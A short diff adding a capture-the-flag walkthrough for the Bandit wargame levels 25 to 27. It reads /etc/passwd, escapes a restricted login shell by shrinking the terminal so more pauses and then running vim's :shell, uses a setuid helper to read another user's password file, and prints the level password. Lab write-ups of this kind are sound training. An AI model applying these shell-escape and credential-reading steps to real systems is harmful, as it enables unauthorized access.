@@ -1,0 +1,20 @@
+Get the ssh key.
+
+This tells u about showtext file.
+cat /etc/passwd | grep bandit26
+
+bandit25@bandit:~$ cat /usr/bin/showtext 
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+
+The trick here is to make the terminal very small so more doesn't finish. 
+Then use vim inside to open a shell.
+The shell was changed so we need to set it
+Get inside, and do set shell=/bin/bash
+Then :shell	
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
